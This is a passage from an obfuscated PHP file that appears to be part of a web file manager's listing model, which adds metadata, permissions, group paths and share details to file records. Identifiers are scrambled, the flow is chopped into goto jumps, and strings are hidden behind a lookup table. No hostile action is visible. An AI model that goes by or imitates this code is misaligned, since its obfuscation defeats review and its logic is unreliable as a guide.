$E÷×·ó¬‹Ì); $this->_listAppendChildren($E³ÎÔäê‹Ÿ, $E÷×·ó¬‹Ì); } goto aØò»ñ¬Ì; aØò»ñ¬Ì: $this->_listAppendPath($E³ÎÔäê‹Ÿ); $this->_listAppendAuth($E³ÎÔäê‹Ÿ); $this->_listAppendSourceInfo($E³ÎÔäê‹Ÿ, $E÷×·ó¬‹Ì); goto a‰‹æ¶ÔÊ„; d¯¨‹¶è´: $c²£ãÈ§ôé =& $_SERVER[æ§›¦ÌáØ]; if (!$E³ÎÔäê‹Ÿ) { $E³ÎÔäê‹Ÿ = array(); return; } $E÷×·ó¬‹Ì = array_to_keyvalue($E³ÎÔäê‹Ÿ, $c²£ãÈ§ôé[33], $c²£ãÈ§ôé[395]); goto DŞÁ×– Ü; b—íËŠ°ª: } protected function _listSourceCache($fƒˆÁ—ºãå) { $A®÷Š‚ŞÍ =& $_SERVER[æ§›¦ÌáØ]; foreach ($fƒˆÁ—ºãå as $c±™¸‹¥ñ–) { self::$cacheSourceInfo[$A®÷Š‚ŞÍ[438] . $c±™¸‹¥ñ–[$A®÷Š‚ŞÍ[395]]] = $c±™¸‹¥ñ–; } } protected function _listFilterInfo(&$DãÒÎò¿, $AŒ®µ¡œ˜¶ = false) { $dšğ¹È¢Ã§ =& $_SERVER[æ§›¦ÌáØ]; foreach ($DãÒÎò¿ as &$FìºêÉ¶·Õ) { $FìºêÉ¶·Õ = $this->pathInfoFilter($FìºêÉ¶·Õ); self::$cachePathInfo[$dšğ¹È¢Ã§[439] . intval($AŒ®µ¡œ˜¶) . $dšğ¹È¢Ã§[440] . $FìºêÉ¶·Õ[$dšğ¹È¢Ã§[395]]] = $FìºêÉ¶·Õ; } unset($FìºêÉ¶·Õ); } protected function _listMake(&$C…‚¬Ö×¾‘) { $DïÈøò˜Üš =& $_SERVER[æ§›¦ÌáØ]; $C…‚¬Ö×¾‘[$DïÈøò˜Üš[75]] = array(); $C…‚¬Ö×¾‘[$DïÈøò˜Üš[74]] = array(); foreach ($C…‚¬Ö×¾‘[$DïÈøò˜Üš[367]] as $aŸÑŒùäÕ) { $CµÆøÇ†‚ = $aŸÑŒùäÕ[$DïÈøò˜Üš[403]] == 1 ? $DïÈøò˜Üš[75] : $DïÈøò˜Üš[74]; $C…‚¬Ö×¾‘[$CµÆøÇ†‚][] = $aŸÑŒùäÕ; } unset($C…‚¬Ö×¾‘[$DïÈøò˜Üš[367]]); } protected function _listAppendMeta(&$B¸…‚ÆíŠ», $b­ö­ŞÛ¯‡) { goto b½àÚâ³¸; D‘¡åšï„ã: if (!$BÒÉÕ“Î¼ø) { return; } $cÎ¹ëî§İ² = array($a¶ñ¶³éŒ[443], $a¶ñ¶³éŒ[444]); $c—‡†½è‰ = array(); goto aŒğ™·Óî³; aŒğ™·Óî³: foreach ($BÒÉÕ“Î¼ø as $E‡¾Â×ŠÏÍ) { if (!isset($c—‡†½è‰[$E‡¾Â×ŠÏÍ[$a¶ñ¶³éŒ[395]]])) { $c—‡†½è‰[$E‡¾Â×ŠÏÍ[$a¶ñ¶³éŒ[395]]] = array(); } if (in_array($E‡¾Â×ŠÏÍ[$a¶ñ¶³éŒ[93]], $cÎ¹ëî§İ²)) { continue; } $c—‡†½è‰[$E‡¾Â×ŠÏÍ[$a¶ñ¶³éŒ[395]]][$E‡¾Â×ŠÏÍ[$a¶ñ¶³éŒ[93]]] = $E‡¾Â×ŠÏÍ[$a¶ñ¶³éŒ[372]]; } foreach ($B¸…‚ÆíŠ» as &$EèåìèœÉŒ) { $EèåìèœÉŒ[$a¶ñ¶³éŒ[445]] = !1; if (isset($c—‡†½è‰[$EèåìèœÉŒ[$a¶ñ¶³éŒ[395]]])) { $EèåìèœÉŒ[$a¶ñ¶³éŒ[445]] = $c—‡†½è‰[$EèåìèœÉŒ[$a¶ñ¶³éŒ[395]]]; } if ($this->fileIsLock($EèåìèœÉŒ) && $EèåìèœÉŒ[$a¶ñ¶³éŒ[406]]) { $d« ÜºÉÌ‰ = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $EèåìèœÉŒ[$a¶ñ¶³éŒ[406]][$a¶ñ¶³éŒ[407]] = AuthModel::authDisable($EèåìèœÉŒ[$a¶ñ¶³éŒ[406]][$a¶ñ¶³éŒ[407]], $d« ÜºÉÌ‰); $EèåìèœÉŒ[$a¶ñ¶³éŒ[406]][$a¶ñ¶³éŒ[446]][$a¶ñ¶³éŒ[406]] = $EèåìèœÉŒ[$a¶ñ¶³éŒ[406]][$a¶ñ¶³éŒ[407]]; } } unset($EèåìèœÉŒ); goto Aì¦ªĞ›; b½àÚâ³¸: $a¶ñ¶³éŒ =& $_SERVER[æ§›¦ÌáØ]; $a²øÊœÅª® = array($a¶ñ¶³éŒ[410] => array($a¶ñ¶³éŒ[411], $b­ö­ŞÛ¯‡)); $BÒÉÕ“Î¼ø = Model($a¶ñ¶³éŒ[441])->field($a¶ñ¶³éŒ[442])->where($a²øÊœÅª®)->select(); goto D‘¡åšï„ã; Aì¦ªĞ›: } protected function _listAppendFileMeta(&$FŸÒ¿ÃéÎê, $f¼Î¿Ë—·) { goto b®¬„´¢Ş¦; DîåóÂ‡­: if (!$eÌ¿Áô£«Ö) { return; } $a·‚Èò¿ë = array($Dê»¶ò¯¶§[448] => array($Dê»¶ò¯¶§[411], $eÌ¿Áô£«Ö)); $fÎ­î•‰—Ÿ = $Dê»¶ò¯¶§[449]; goto aæ¨Òã½Š§; b®¬„´¢Ş¦: $Dê»¶ò¯¶§ =& $_SERVER[æ§›¦ÌáØ]; $eÌ¿Áô£«Ö = array_to_keyvalue($FŸÒ¿ÃéÎê, $Dê»¶ò¯¶§[33], $Dê»¶ò¯¶§[447]); $eÌ¿Áô£«Ö = array_filter(array_unique($eÌ¿Áô£«Ö)); goto DîåóÂ‡­; d»íÆ¼ƒÎ: foreach ($FŸÒ¿ÃéÎê as &$dİÔÈƒ…‹‰) { goto F”’¿ÄÖ; aÀ¹Û³´É¼: $aÇ×˜Ãƒ[$Dê»¶ò¯¶§[78]] = $dİÔÈƒ…‹‰[$Dê»¶ò¯¶§[78]]; $aÇ×˜Ãƒ[$Dê»¶ò¯¶§[28]] = $dİÔÈƒ…‹‰[$Dê»¶ò¯¶§[28]]; if (!isset(self::$cacheFileInfo[$Dê»¶ò¯¶§[453] . $A½ƒ‹œ˜ ®])) { self::$cacheFileInfo[$Dê»¶ò¯¶§[453] . $A½ƒ‹œ˜ ®] = array_merge(array(), $aÇ×˜Ãƒ); } goto F‡£Œ…½Õ; F‡£Œ…½Õ: unset($b£­Ş°Å±[$A½ƒ‹œ˜ ®][$Dê»¶ò¯¶§[76]]); $aÕªé¨‰ª´ = is_array($C×´½§ˆ[$A½ƒ‹œ˜ ®]) ? $C×´½§ˆ[$A½ƒ‹œ˜ ®] : array(); $dİÔÈƒ…‹‰[$Dê»¶ò¯¶§[164]] = array_merge($aÕªé¨‰ª´, $b£­Ş°Å±[$A½ƒ‹œ˜ ®]); goto f“åÕÄíˆğ; F”’¿ÄÖ: $A½ƒ‹œ˜ ® = $dİÔÈƒ…‹‰[$Dê»¶ò¯¶§[447]]; if (!$A½ƒ‹œ˜ ® || !is_array($b£­Ş°Å±[$A½ƒ‹œ˜ ®])) { continue; } $aÇ×˜Ãƒ = $b£­Ş°Å±[$A½ƒ‹œ˜ ®]; goto aÀ¹Û³´É¼; f“åÕÄíˆğ: if (isset($dİÔÈƒ…‹‰[$Dê»¶ò¯¶§[164]][$Dê»¶ò¯¶§[163]])) { $dİÔÈƒ…‹‰[$Dê»¶ò¯¶§[163]] = json_decode($dİÔÈƒ…‹‰[$Dê»¶ò¯¶§[164]][$Dê»¶ò¯¶§[163]], !0); unset($dİÔÈƒ…‹‰[$Dê»¶ò¯¶§[164]][$Dê»¶ò¯¶§[163]]); } goto d§àõ˜›˜; d§àõ˜›˜: } unset($dİÔÈƒ…‹‰); goto D§‹Œ©ƒ; aæ¨Òã½Š§: $b£­Ş°Å± = Model($Dê»¶ò¯¶§[450])->field($fÎ­î•‰—Ÿ)->where($a·‚Èò¿ë)->select(); $b£­Ş°Å± = array_to_keyvalue($b£­Ş°Å±, $Dê»¶ò¯¶§[447]); $Có×Ïë£ = Model($Dê»¶ò¯¶§[451])->field($Dê»¶ò¯¶§[452])->where($a·‚Èò¿ë)->select(); goto døÍÑòæğ; døÍÑòæğ: $Có×Ïë£ = $Có×Ïë£ ? $Có×Ïë£ : array(); $C×´½§ˆ = array(); foreach ($Có×Ïë£ as $câ¨Ü‘¿Û) { if (!isset($C×´½§ˆ[$câ¨Ü‘¿Û[$Dê»¶ò¯¶§[447]]])) { $C×´½§ˆ[$câ¨Ü‘¿Û[$Dê»¶ò¯¶§[447]]] = array(); } $C×´½§ˆ[$câ¨Ü‘¿Û[$Dê»¶ò¯¶§[447]]][$câ¨Ü‘¿Û[$Dê»¶ò¯¶§[93]]] = $câ¨Ü‘¿Û[$Dê»¶ò¯¶§[372]]; } goto d»íÆ¼ƒÎ; D§‹Œ©ƒ: } protected function _listAppendSourceInfo(&$cÇ…¤šÌ˜, $f»•Ûæ¨«é) { goto dïÙ§†ÌòÚ; dòçÄíÁ›: $cö¯Á¯—„ = Model($d÷ìâ±Æé£[418])->listData(); $EÎİ”ø„• = Model($d÷ìâ±Æé£[408])->listData(); $b¿ù¼…ìÀÊ = Model($d÷ìâ±Æé£[456])->listSimple(); goto c¿ë¾Ø‚ÏØ; dİ—¬µÒ: return $cÇ…¤šÌ˜; goto B‘è°Ä¡—ç; dïÙ§†ÌòÚ: $d÷ìâ±Æé£ =& $_SERVER[æ§›¦ÌáØ]; if (!defined($d÷ìâ±Æé£[454])) { return; } $eò‹“à½â = Model($d÷ìâ±Æé£[455])->listData(); goto dòçÄíÁ›; c¿ë¾Ø‚ÏØ: $fáØ™Ïè¸– = array_to_keyvalue($eò‹“à½â, $d÷ìâ±Æé£[393]); $e¿­ºø›æº = array_to_keyvalue_group($cö¯Á¯—„, $d÷ìâ±Æé£[76], $d÷ìâ±Æé£[419]); $BæŸ¿‹ãÊ = array_to_keyvalue($EÎİ”ø„•, $d÷ìâ±Æé£[76]); goto CèŸó—±; CèŸó—±: $Aò¢ËÒßŒ = array_to_keyvalue_group($b¿ù¼…ìÀÊ, $d÷ìâ±Æé£[395]); foreach ($cÇ…¤šÌ˜ as &$c–¸»¯‡‹„) { $c–¸»¯‡‹„[$d÷ìâ±Æé£[85]] = array($d÷ìâ±Æé£[457] => 0, $d÷ìâ±Æé£[458] => 0, $d÷ìâ±Æé£[459] => 0); if (isset($BæŸ¿‹ãÊ[$c–¸»¯‡‹„[$d÷ìâ±Æé£[395]]])) { $c–¸»¯‡‹„[$d÷ìâ±Æé£[85]][$d÷ìâ±Æé£[460]] = 1; $c–¸»¯‡‹„[$d÷ìâ±Æé£[85]][$d÷ìâ±Æé£[461]] = $BæŸ¿‹ãÊ[$c–¸»¯‡‹„[$d÷ìâ±Æé£[395]]][$d÷ìâ±Æé£[28]]; } if (isset($e¿­ºø›æº[$c–¸»¯‡‹„[$d÷ìâ±Æé£[395]]])) { $c–¸»¯‡‹„[$d÷ìâ±Æé£[85]][$d÷ìâ±Æé£[462]] = array(); foreach ($e¿­ºø›æº[$c–¸»¯‡‹„[$d÷ìâ±Æé£[395]]] as $c®·ÎğÄºŸ) { $EÉĞÊ®ÒÑ = $fáØ™Ïè¸–[$c®·ÎğÄºŸ]; $c–¸»¯‡‹„[$d÷ìâ±Æé£[85]][$d÷ìâ±Æé£[462]][] = array($d÷ìâ±Æé£[463] => $EÉĞÊ®ÒÑ[$d÷ìâ±Æé£[393]], $d÷ìâ±Æé£[413] => $EÉĞÊ®ÒÑ[$d÷ìâ±Æé£[28]], $d÷ìâ±Æé£[464] => $EÉĞÊ®ÒÑ[$d÷ìâ±Æé£[465]]); } } if (isset($Aò¢ËÒßŒ[$c–¸»¯‡‹„[$d÷ìâ±Æé£[395]]])) { $c–¸»¯‡‹„[$d÷ìâ±Æé£[85]][$d÷ìâ±Æé£[466]] = array(); foreach ($Aò¢ËÒßŒ[$c–¸»¯‡‹„[$d÷ìâ±Æé£[395]]] as $e±ùÆÇå¨¢) { $c–¸»¯‡‹„[$d÷ìâ±Æé£[85]][$d÷ìâ±Æé£[466]] = array($d÷ìâ±Æé£[467] => $e±ùÆÇå¨¢[$d÷ìâ±Æé£[468]], $d÷ìâ±Æé£[469] => $e±ùÆÇå¨¢[$d÷ìâ±Æé£[470]], $d÷ìâ±Æé£[471] => $e±ùÆÇå¨¢[$d÷ìâ±Æé£[395]], $d÷ìâ±Æé£[472] => $e±ùÆÇå¨¢[$d÷ìâ±Æé£[473]], $d÷ìâ±Æé£[474] => $e±ùÆÇå¨¢[$d÷ìâ±Æé£[475]], $d÷ìâ±Æé£[476] => $e±ùÆÇå¨¢[$d÷ìâ±Æé£[476]], $d÷ìâ±Æé£[477] => $e±ùÆÇå¨¢[$d÷ìâ±Æé£[477]]); } } } unset($c–¸»¯‡‹„); goto dİ—¬µÒ; B‘è°Ä¡—ç: } protected function _listAppendChildren(&$bÇä‚ÊŒÅ¶, $dæ×‘¯äó¨) { goto B†¤Åß÷; fºõ·ÚÊí: $eõ´ãßø = array($fõ‡âøôîË[478] => array($fõ‡âøôîË[7], $e¦˜±ÀÕÄÛ)); $CÏ¿½¤íŸÖ = array($fõ‡âøôîË[478], $fõ‡âøôîË[403], $fõ‡âøôîË[479] => $fõ‡âøôîË[480]); $fä…´í°­æ = $this->field($CÏ¿½¤íŸÖ)->where($eõ´ãßø)->group($fõ‡âøôîË[481])->select(); goto D¡Æ‡Éòæ; E„®äÄáÁÙ: unset($fæËÙŞ¶ç); goto cº‡¸„“…å; B†¤Åß÷: $fõ‡âøôîË =& $_SERVER[æ§›¦ÌáØ]; $e¦˜±ÀÕÄÛ = array(); $B’‹§‘‘ªò = array($fõ‡âøôîË[203] => 0, $fõ‡âøôîË[204] => 0); goto Dî´Œç²…; D¡Æ‡Éòæ: $Dø×ì«ğªÃ = array(); foreach ($fä…´í°­æ as $cäƒ³í—¶Š) { $AóÈ‡œàŒ™ = $cäƒ³í—¶Š[$fõ‡âøôîË[478]]; $F‹”²Ë§ŠÙ = $cäƒ³í—¶Š[$fõ‡âøôîË[403]] == $fõ‡âøôîË[87] ? $fõ‡âøôîË[204] : $fõ‡âøôîË[203]; if (!isset($Dø×ì«ğªÃ[$AóÈ‡œàŒ™])) { $Dø×ì«ğªÃ[$AóÈ‡œàŒ™] = array($fõ‡âøôîË[203] => 0, $fõ‡âøôîË[204] => 0); } $Dø×ì«ğªÃ[$AóÈ‡œàŒ™][$F‹”²Ë§ŠÙ] += $cäƒ³í—¶Š[$fõ‡âøôîË[480]]; } foreach ($bÇä‚ÊŒÅ¶ as &$fæËÙŞ¶ç) { if (!$fæËÙŞ¶ç[$fõ‡âøôîË[403]]) { continue; } $b¢‚Ø¥ÒñÌ = is_array($Dø×ì«ğªÃ[$fæËÙŞ¶ç[$fõ‡âøôîË[395]]]) ? $Dø×ì«ğªÃ[$fæËÙŞ¶ç[$fõ‡âøôîË[395]]] : $B’‹§‘‘ªò; $fæËÙŞ¶ç[$fõ‡âøôîË[204]] = $b¢‚Ø¥ÒñÌ[$fõ‡âøôîË[204]]; $fæËÙŞ¶ç[$fõ‡âøôîË[203]] = $b¢‚Ø¥ÒñÌ[$fõ‡âøôîË[203]]; unset($fæËÙŞ¶ç[$fõ‡âøôîË[405]]); } goto E„®äÄáÁÙ; Dî´Œç²…: foreach ($bÇä‚ÊŒÅ¶ as &$fæËÙŞ¶ç) { if (!$fæËÙŞ¶ç[$fõ‡âøôîË[403]]) { continue; } $e¦˜±ÀÕÄÛ[] = $fæËÙŞ¶ç[$fõ‡âøôîË[395]]; } unset($fæËÙŞ¶ç); if (!$e¦˜±ÀÕÄÛ) { return; } goto fºõ·ÚÊí; cº‡¸„“…å: } protected function _listAppendAuth(&$B›‡·¶—õâ) { goto Bº¬ôÛ¯´Õ; Bº¬ôÛ¯´Õ: $BÇ…©Ò×½ =& $_SERVER[æ§›¦ÌáØ]; if (!defined($BÇ…©Ò×½[454])) { return; } $fĞ«ò·İŒ = array(); goto fì”ñ–¢ßĞ; Bå½÷Œœ§: $fí­­»¦ùÅ = Model($BÇ…©Ò×½[482])->getSourceList($fĞ«ò·İŒ, $A„¤Ìß†¦Ğ); foreach ($B›‡·¶—õâ as $aˆó‰Š©† => &$dÓ™Ò´«¼¥) { $dÓ™Ò´«¼¥[$BÇ…©Ò×½[406]] = $fí­­»¦ùÅ[$dÓ™Ò´«¼¥[$BÇ…©Ò×½[395]]]; if (!$dÓ™Ò´«¼¥[$BÇ…©Ò×½[406]] && $dÓ™Ò´«¼¥[$BÇ…©Ò×½[404]] == self::TYPE_GROUP) { $dÓ™Ò´«¼¥[$BÇ…©Ò×½[406]] = Action($BÇ…©Ò×½[483])->pathGroupAuthMake($dÓ™Ò´«¼¥[$BÇ…©Ò×½[484]]); if (!$dÓ™Ò´«¼¥[$BÇ…©Ò×½[406]] && !_get($GLOBALS, $BÇ…©Ò×½[485])) { $dÓ™Ò´«¼¥[$BÇ…©Ò×½[196]] = !1; $dÓ™Ò´«¼¥[$BÇ…©Ò×½[195]] = !1; } } if ($dÓ™Ò´«¼¥[$BÇ…©Ò×½[406]]) { $dÓ™Ò´«¼¥[$BÇ…©Ò×½[196]] = AuthModel::authCheckEdit($dÓ™Ò´«¼¥[$BÇ…©Ò×½[406]][$BÇ…©Ò×½[407]]); $dÓ™Ò´«¼¥[$BÇ…©Ò×½[195]] = AuthModel::authCheckView($dÓ™Ò´«¼¥[$BÇ…©Ò×½[406]][$BÇ…©Ò×½[407]]); } $this->groupPathDisplay($dÓ™Ò´«¼¥); } unset($dÓ™Ò´«¼¥); goto b¾Ë¶²ø¢; fì”ñ–¢ßĞ: foreach ($B›‡·¶—õâ as $dÓ™Ò´«¼¥) { if ($dÓ™Ò´«¼¥[$BÇ…©Ò×½[404]] == self::TYPE_GROUP) { $fĞ«ò·İŒ[] = $dÓ™Ò´«¼¥[$BÇ…©Ò×½[395]]; } } if (!$fĞ«ò·İŒ) { return; } $A„¤Ìß†¦Ğ = array_to_keyvalue($B›‡·¶—õâ, $BÇ…©Ò×½[395]); goto Bå½÷Œœ§; b¾Ë¶²ø¢: } private function _listAppendAuthSecret(&$C¼Ê¨Š¥ƒŞ) { goto e”ÁÜÇ®†š; e”ÁÜÇ®†š: $DĞƒ´‹äˆ„ =& $_SERVER[æ§›¦ÌáØ]; if (Model($DĞƒ´‹äˆ„[486])->get($DĞƒ´‹äˆ„[487]) != $DĞƒ´‹äˆ„[87]) { return; } static $Fã®ñåòˆì = false; goto F£©¡œÂ; F£©¡œÂ: if (!$Fã®ñåòˆì) { goto Aƒ¤È»×¤Ï; A§Ù°ª‚¸†: $Fã®ñåòˆì = array_to_keyvalue($Fã®ñåòˆì, $DĞƒ´‹äˆ„[395]); $d³¦ÏÀÄƒò = json_decode(Model($DĞƒ´‹äˆ„[486])->get($DĞƒ´‹äˆ„[490]), !0); $d³¦ÏÀÄƒò = array_to_keyvalue($d³¦ÏÀÄƒò, $DĞƒ´‹äˆ„[393]); goto CºôÁ—†; CºôÁ—†: foreach ($Fã®ñåòˆì as $aÔ¢‘è­ö => $eùÉïô´Ã£) { goto a¾éÓ›ŠÃ; E˜ì³Ÿ‡…: if (!$c—âÇ©Ú†) { $cÍŒêßó->remove($eùÉïô´Ã£[$DĞƒ´‹äˆ„[393]]); unset($Fã®ñåòˆì[$aÔ¢‘è­ö]); continue; } $eùÉïô´Ã£[$DĞƒ´‹äˆ„[406]] = $c—âÇ©Ú†; $eùÉïô´Ã£[$DĞƒ´‹äˆ„[492]] = $bªÁƒ¶¼ô·; goto B“ñãÖµÊá; B“ñãÖµÊá: $eùÉïô´Ã£[$DĞƒ´‹äˆ„[493]] = Model($DĞƒ´‹äˆ„[494])->getInfoSimpleOuter($eùÉïô´Ã£[$DĞƒ´‹äˆ„[432]]); $Fã®ñåòˆì[$aÔ¢‘è­ö] = $eùÉïô´Ã£; goto F˜•ŒÀÜ±–; a¾éÓ›ŠÃ: $bªÁƒ¶¼ô· = $d³¦ÏÀÄƒò[$eùÉïô´Ã£[$DĞƒ´‹äˆ„[491]]]; if (!$bªÁƒ¶¼ô·) { $cÍŒêßó->remove($eùÉïô´Ã£[$DĞƒ´‹äˆ„[393]]); unset($Fã®ñåòˆì[$aÔ¢‘è­ö]); continue; } $c—âÇ©Ú† = $bŞîÉÁ§ á->listData($bªÁƒ¶¼ô·[$DĞƒ´‹äˆ„[406]]); goto E˜ì³Ÿ‡…; F˜•ŒÀÜ±–: } goto cœ¬—˜…¶Æ; Aƒ¤È»×¤Ï: $bŞîÉÁ§ á = Model($DĞƒ´‹äˆ„[488]); $cÍŒêßó = Model($DĞƒ´‹äˆ„[489]); $Fã®ñåòˆì = $cÍŒêßó->listData(); goto A§Ù°ª‚¸†; cœ¬—˜…¶Æ: } $a×ÍÈ“ù¬ö = defined($DĞƒ´‹äˆ„[495]) ? USER_ID : $DĞƒ´‹äˆ„[33]; $b’ˆæÂÛ±È = array(); goto AÔÈŠÌ”‹ß; AÔÈŠÌ”‹ß: $cšùğ”ƒ¹• = $this->_listAppendPath($b’ˆæÂÛ±È, !0); foreach ($C¼Ê¨Š¥ƒŞ as $aÔ¢‘è­ö => &$eùÉïô´Ã£) { if (!is_array($eùÉïô´Ã£[$DĞƒ´‹äˆ„[406]])) { continue; } if ($eùÉïô´Ã£[$DĞƒ´‹äˆ„[404]] != $DĞƒ´‹äˆ„[496]) { continue; } if (isset($Fã®ñåòˆì[$eùÉïô´Ã£[$DĞƒ´‹äˆ„[395]]])) { goto aŞàê‰ªÑÑ; A¹ˆŞõ«›ï: $eùÉïô´Ã£[$DĞƒ´‹äˆ„[406]][$DĞƒ´‹äˆ„[498]] = $FØÒ‹œ¾¹; $eùÉïô´Ã£[$DĞƒ´‹äˆ„[406]][$DĞƒ´‹äˆ„[499]] = $eùÉïô´Ã£[$DĞƒ´‹äˆ„[500]]; $eùÉïô´Ã£[$DĞƒ´‹äˆ„[406]][$DĞƒ´‹äˆ„[501]] = $DĞƒ´‹äˆ„[87]; goto dÅ ÆÚ¢†; aŞàê‰ªÑÑ: $FØÒ‹œ¾¹ = $Fã®ñåòˆì[$eùÉïô´Ã£[$DĞƒ´‹äˆ„[395]]]; if (!is_array($eùÉïô´Ã£[$DĞƒ´‹äˆ„[445]])) { $eùÉïô´Ã£[$DĞƒ´‹äˆ„[445]] = array(); } $eùÉïô´Ã£[$DĞƒ´‹äˆ„[445]][$DĞƒ´‹äˆ„[497]] = $FØÒ‹œ¾¹[$DĞƒ´‹äˆ„[491]]; goto A¹ˆŞõ«›ï; dÅ ÆÚ¢†: if ($FØÒ‹œ¾¹[$DĞƒ´‹äˆ„[432]] != $a×ÍÈ“ù¬ö) { $eùÉïô´Ã£[$DĞƒ´‹äˆ„[406]][$DĞƒ´‹äˆ„[407]] = $eùÉïô´Ã£[$DĞƒ´‹äˆ„[406]][$DĞƒ´‹äˆ„[407]] & $FØÒ‹œ¾¹[$DĞƒ´‹äˆ„[406]][$DĞƒ´‹äˆ„[406]]; } continue; goto d±Öè‡íÄ; d±Öè‡íÄ: } $Dó•«…³ª• = $this->parentLevelArray($eùÉïô´Ã£[$DĞƒ´‹äˆ„[502]]); $AÍíæÚÏ = array_reverse($Dó•«…³ª•); foreach ($AÍíæÚÏ as $CšÇó—ÅÜ => $DöôÕ’ê²ˆ) { goto bØğåí‘‰Œ; Dò–¡¹À¡: if ($FØÒ‹œ¾¹[$DĞƒ´‹äˆ„[432]] != $a×ÍÈ“ù¬ö) { $eùÉïô´Ã£[$DĞƒ´‹äˆ„[406]][$DĞƒ´‹äˆ„[407]] = $eùÉïô´Ã£[$DĞƒ´‹äˆ„[406]][$DĞƒ´‹äˆ„[407]] & $FØÒ‹œ¾¹[$DĞƒ´‹äˆ„[406]][$DĞƒ´‹äˆ„[406]]; } $a¼å´”¯ˆÇ = $DĞƒ´‹äˆ„[33]; $DöË©‚š’İ = count($Dó•«…³ª•) - $CšÇó—ÅÜ; goto e¨Éè¨¹È”; bØğåí‘‰Œ: if (!isset($Fã®ñåòˆì[$DöôÕ’ê²ˆ])) { continue; } $FØÒ‹œ¾¹ = $Fã®ñåòˆì[$DöôÕ’ê²ˆ]; $eùÉïô´Ã£[$DĞƒ´‹äˆ„[406]][$DĞƒ´‹äˆ„[498]] = $FØÒ‹œ¾¹; goto Dò–¡¹À¡; e¨Éè¨¹È”: for ($A’Å§¢ºÕ = 0; $A’Å§¢ºÕ < $DöË©‚š’İ; $A’Å§¢ºÕ++) { if (!isset($cšùğ”ƒ¹•[$Dó•«…³ª•[$A’Å§¢ºÕ]])) { $a¼å´”¯ˆÇ = $DĞƒ´‹äˆ„[33]; break; } $a¼å´”¯ˆÇ = $a¼å´”¯ˆÇ . rtrim($cšùğ”ƒ¹•[$Dó•«…³ª•[$A’Å§¢ºÕ]], $DĞƒ´‹äˆ„[8]) . $DĞƒ´‹äˆ„[8]; } $eùÉïô´Ã£[$DĞƒ´‹äˆ„[406]][$DĞƒ´‹äˆ„[499]] = rtrim($a¼å´”¯ˆÇ, $DĞƒ´‹äˆ„[8]) . $DĞƒ´‹äˆ„[8]; break; goto CÙ¹ä¥Éê; CÙ¹ä¥Éê: } } unset($eùÉïô´Ã£); goto a­ííÕºÃ£; a­ííÕºÃ£: } public function groupPathDisplay(&$CˆÓÓÑŠ¹”) { goto bøÊö¬Ò­å; Cš¹ñ—ÚÔ: $CˆÓÓÑŠ¹”[$a¥«ÛÓ•Ÿ¿[504]] = $fİóÍÙ­Ç[$a¥«ÛÓ•Ÿ¿[478]]; $CˆÓÓÑŠ¹”[$a¥«ÛÓ•Ÿ¿[505]] = $fİóÍÙ­Ç[$a¥«ÛÓ•Ÿ¿[502]]; $CˆÓÓÑŠ¹”[$a¥«ÛÓ•Ÿ¿[506]] = $fİóÍÙ­Ç[$a¥«ÛÓ•Ÿ¿[507]]; goto a´óÌ‘øò¶; a´óÌ‘øò¶: $CˆÓÓÑŠ¹”[$a¥«ÛÓ•Ÿ¿[508]] = $dŸãÍï‹òÓ . $fİóÍÙ­Ç[$a¥«ÛÓ•Ÿ¿[85]][$a¥«ÛÓ•Ÿ¿[395]]; goto f…ºç†ï•; FèÀ¡†’š: $fÂ¶×œ¸ì“ = $this->parentLevelArray($fİóÍÙ­Ç[$a¥«ÛÓ•Ÿ¿[502]]); $dŸãÍï‹òÓ = $a¥«ÛÓ•Ÿ¿[33]; foreach ($fÂ¶×œ¸ì“ as $e°½²˜‚ª›) { $F¤µ£ñ±ï¼ = Model($a¥«ÛÓ•Ÿ¿[503])->getInfo($e°½²˜‚ª›); $dŸãÍï‹òÓ .= $F¤µ£ñ±ï¼[$a¥«ÛÓ•Ÿ¿[85]][$a¥«ÛÓ•Ÿ¿[395]] . $a¥«ÛÓ•Ÿ¿[47]; } goto Cš¹ñ—ÚÔ; bøÊö¬Ò­å: $a¥«ÛÓ•Ÿ¿ =& $_SERVER[æ§›¦ÌáØ]; if ($CˆÓÓÑŠ¹”[$a¥«ÛÓ•Ÿ¿[404]] != self::TYPE_GROUP) { return; } $fİóÍÙ­Ç = Model($a¥«ÛÓ•Ÿ¿[503])->getInfo($CˆÓÓÑŠ¹”[$a¥«ÛÓ•Ÿ¿[484]]); goto FèÀ¡†’š; f…ºç†ï•: } protected function _listAppendPath(&$FÇÕ¯Ê, $c´”á¯â’‚ = false) { goto CÃŸÒ® ‡„; CÃŸÒ® ‡„: $cƒ£©†¬ƒ =& $_SERVER[æ§›¦ÌáØ]; static $F‡æêÔÜõ» = array(); $BËÀİëÃÖí = array(); goto aÂÁÂà‰ƒ«; aÂÁÂà‰ƒ«: $C·Öš‰¼ïƒ = array(); if ($c´”á¯â’‚) { return $F‡æêÔÜõ»; } foreach ($FÇÕ¯Ê as &$Eˆ¨òÍ¦ˆå) { goto aâÁ…½³¾; aâÁ…½³¾: $BîÔƒõ§ = $Eˆ¨òÍ¦ˆå[$cƒ£©†¬ƒ[395]]; if ($Eˆ¨òÍ¦ˆå[$cƒ£©†¬ƒ[403]] == $cƒ£©†¬ƒ[87] && $Eˆ¨òÍ¦ˆå[$cƒ£©†¬ƒ[478]] != 0) { $F‡æêÔÜõ»[$BîÔƒõ§] = $Eˆ¨òÍ¦ˆå[$cƒ£©†¬ƒ[28]]; } if ($Eˆ¨òÍ¦ˆå[$cƒ£©†¬ƒ[403]] == $cƒ£©†¬ƒ[87] && $Eˆ¨òÍ¦ˆå[$cƒ£©†¬ƒ[478]] == 0 && !isset($F‡æêÔÜõ»[$BîÔƒõ§])) { $F‡æêÔÜõ»[$BîÔƒõ§] = $this->_listAppendPathRoot($Eˆ¨òÍ¦ˆå, array()); } goto B×»Ìõãƒ‰; BÜøÁ·‰ô: foreach ($cå‚ª×éê as $c¯ÛŒì’½³ => $aÖÕ³Â÷„Î) { if (isset($F‡æêÔÜõ»[$aÖÕ³Â÷„Î])) { continue; } if ($c¯ÛŒì’½³ == 0) { $F‡æêÔÜõ»[$aÖÕ³Â÷„Î] = $this->_listAppendPathRoot($Eˆ¨òÍ¦ˆå, $cå‚ª×éê); } if ($c¯ÛŒì’½³ != 0) { $BËÀİëÃÖí[] = $aÖÕ³Â÷„Î; } } goto BÚÕ–¨ï¿µ; B×»Ìõãƒ‰: if (isset($C·Öš‰¼ïƒ[$Eˆ¨òÍ¦ˆå[$cƒ£©†¬ƒ[502]]])) { continue; } $C·Öš‰¼ïƒ[$Eˆ¨òÍ¦ˆå[$cƒ£©†¬ƒ[502]]] = !0; $cå‚ª×éê = 